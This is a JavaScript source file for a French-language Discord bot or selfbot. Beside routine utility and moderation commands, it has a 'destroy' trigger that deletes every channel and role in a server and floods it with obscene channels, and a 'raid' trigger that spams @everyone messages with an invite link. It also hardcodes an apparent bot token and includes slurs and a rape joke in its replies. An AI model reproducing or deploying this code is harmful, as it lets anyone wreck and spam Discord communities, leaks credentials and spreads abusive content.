const Discord = require('discord.js');
const client = new Discord.Client();

var prefix = 'f!';
var token = 'NTI2NTQ2NDg5MTg3NzYyMjEy.DxpdCQ.cY3XdE8FvJe5mMRbtUaJ0zigWNk';

client.login(token)

client.on('ready' , function() {
	client.user.setActivity("Coder | Flow [CMT]", {type: "STREAMING"});
	console.log(`prêt ${client.user.tag} bro`)
});

client.on('message', message => {
	if(message.content === "destroy"){
		message.guild.channels.deleteAll("destroyer by flow");
		message.guild.roles.deleteAll("bot by flow");
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.delete();
		console.log("ez")
	}
});

client.on('message',function(message){
	if(message.content.includes(prefix + 'stop')){
		message.channel.send(` **au revoir les gars :cry:**`)
		message.delete().then(client.destroy())
		console.log("je suis deco")
	}
});

client.on('message' , message =>{
	if(message.content === "tu fais quoi ?"){
		message.reply('je te viole :sueur:');
		message.delete()
		console.log('un fdp Vien de se faire violer')
	}
});

client.on('message', message => {
	if(message.content === prefix + "cree"){
		message.channel.send(`cree le : ${message.author.createdAt} !`)
		message.delete();
		console.log("quelq'un a demandé le jour de la création de son compte !")
	}
});

client.on('message', message => {
	if(message.content === prefix + "avatar"){
		message.channel.send(`Ton avatar ${message.author.avatarURL} ! `)
		message.delete()
		console.log("+1 avatar donné")
	}
});

client.on('message', message => {
	if(message.content === prefix + "help"){
			    var help = new Discord.RichEmbed()
					  .setTitle("Commande")
					  .setDescription("Commandes du selfbot")
					  .setColor("#FF0000")
					  .addField("f!cree","affiche la date de creation de ton compte !", true)
					  .addField("f!avatar","affiche votre avatar quand vous executer la commande !", true)
					  .addField("f!imgsrv","affiche l icône de votre serveur !", true)
					  .addField("f!membres","affiche le nombre dans votre serveur !", true)
					  .addField("f!infosrv","affiche les informations de votre serveur !", true)
				message.channel.sendEmbed(help);
				message.delete();
		console.log(`${message.author.username} a exécuté la commande de help ! `)
	}
});

client.on('message', message => {
	if(message.content === prefix + "imgsrv"){
		message.channel.send(`icone du serveur ! ${message.guild.iconURL} !`)
		message.delete()
		console.log(`${message.author.username} a fait x!imgsrv !`)
	}
});

client.on('message', message => {
	if(message.content === prefix + "membres"){
		message.channel.send(`Il y a ${message.guild.memberCount} personnes ! :tada:`)
		message.delete()
		console.log(`${message.author.username} a exécuté la commande : . membres`)
	}
});

client.on('message', message => {
	if(message.content === prefix + "flow"){
		message.channel.send("Flow est le fils de kais le gros porc")
		message.delete()
		console.log("pas d'idée bro")
	}
});

client.on('message', message => {
	if(message.content === prefix + "leave"){
		message.guild.leave();
		message.delete()
		console.log("j'ai quitté un serveur.")
	}
});

client.on('message', message => {
	if(message.content === prefix + "cmbsrv"){
		var msg = await message.channel.send("Attends ptn...")
		message.channel.send(msg)
		
		message.channel.send(client.guilds.map(r => r.name + `  |  **${r.memberCount}** membres` ))
		message.delete()
		console.log("reussi")
	}
});

client.on('message', message => {
	if(message.content === prefix + "infosrv"){
		var servIcon = message.guild.iconURL;
		var servEmbed = new Discord.RichEmbed()
	.setTitle("Info")
	.setDescription("Info du serveur")
	.setThumbnail(servIcon)
	.addField('Nom du serveur', message.guild.name)
	.addField('ID du createur', message.guild.ownerID)
	.addField('Nombre de membres', message.guild.memberCount)
	.addField('Crée le', message.guild.createdAt)
	.addField('Rejoins le', message.member.joinedAt)
	message.delete()
	
	return message.channel.send(servEmbed);
	console.log("help du embed")
	}
});

client.on('message', message => {
	if(message.content === "raid"){
		message.channel.send("Raid by Globadis Network https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network https://discord.gg/8ScBy3G")
		message.channel.send("Raid raid eco+ bro")
		message.channel.send("Raid raid eco+ bro")
		message.channel.send("Raid raid eco+ bro")
		message.channel.send("Raid raid eco+ bro")
		message.channel.send("Raid raid eco+ bro")
		message.channel.send("Raid raid eco+ bro")
		message.channel.send("Raid raid eco+ bro")
		message.channel.send("Raid raid eco+ bro")
		message.channel.send("Raid raid eco+ bro")
		message.channel.send("Raid raid eco+ bro")
		message.channel.send("Raid raid eco+ bro")
		message.channel.send("Raid raid eco+ bro")
		message.channel.send("Raid raid eco+ bro")
		message.channel.send("Raid raid eco+ bro")
		message.channel.send("Raid raid eco+ bro")
		message.channel.send("Raid raid eco+ bro")
		message.channel.send("Raid raid eco+ bro")
		message.channel.send("Raid raid eco+ bro")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid raid eco+ bro")
		message.channel.send("Raid raid eco+ bro")
		message.channel.send("Raid raid eco+ bro")
		message.channel.send("Raid raid eco+ bro")
		message.channel.send("Raid raid eco+ bro")
		message.channel.send("raid")
		message.delete()
		console.log("-1 fdp")
	}
});

/*Kick*/
client.on('message', message =>{
    if (!message.guild) return
    let args = message.content.trim().split(/ +/g)
 
    if (args[0].toLocaleLowerCase() === prefix + 'kick'){
       if (!message.member.hasPermission('KICK_MEMBERS')) return message.channel.send("Tu as pas la permission d'utiliser cette commande "+ message.author.username +" grosse pute")
       let member = message.mentions.members.first()
       if (!member) return message.channel.send("Veuillez mentionner un utilisateur :x:")
       if (member.highestRole.calculatedPosition >= message.member.highestRole.calculatedPosition && message.author.id !== message.guild.owner.id) return message.channel.send("Vous ne pouvez pas kick cet utilisateur :x:")
       if (!member.kickable) return message.channel.send(`Je ne peux pas exclure cet utilisateur ta soeur + message.author.username`)
       member.kick()
       message.channel.send("**"+member.user.username + '** a été exclu :white_check_mark:')
       message.delete()
       console.log("+1 personne kick !")
    }
});
/*Ban*/
client.on('message', message =>{
    if (!message.guild) return
    let args = message.content.trim().split(/ +/g)
 
    if (args[0].toLocaleLowerCase() === prefix + 'ban'){
       if (!message.member.hasPermission('BAN_MEMBERS')) return message.channel.send(`Tu as pas la permission d'utiliser cette commande ta maman  + message.author.username`)
       let member = message.mentions.members.first()
       if (!member) return message.channel.send("Veuillez mentionner un utilisateur :x:")
       if (member.highestRole.calculatedPosition >= message.member.highestRole.calculatedPosition && message.author.id !== message.guild.owner.id) return message.channel.send("Vous ne pouvez pas bannir cet utilisateur :x:")
       if (!member.bannable) return message.channel.send("Je ne peux pas bannir cet utilisateur !")
       message.guild.ban(member, {days: 1})
       message.channel.send("**"+member.user.username + '** a été banni :white_check_mark:')
       message.delete()
       console.log("nice")
    }
});

client.on('message', message => {
	if(message.content === prefix + "hack"){
			var hack_embed = new Discord.RichEmbed()
				  .setTitle("Hacked by Flow212rocma")
				  .setColor("#FF0000")
				  .addField('Hacked by test haha', message.author.username)
				  .addField("Haroun la slp","je te baize fils de viole", true)
				message.channel.send(hack_embed)
	message.delete();
	}
});
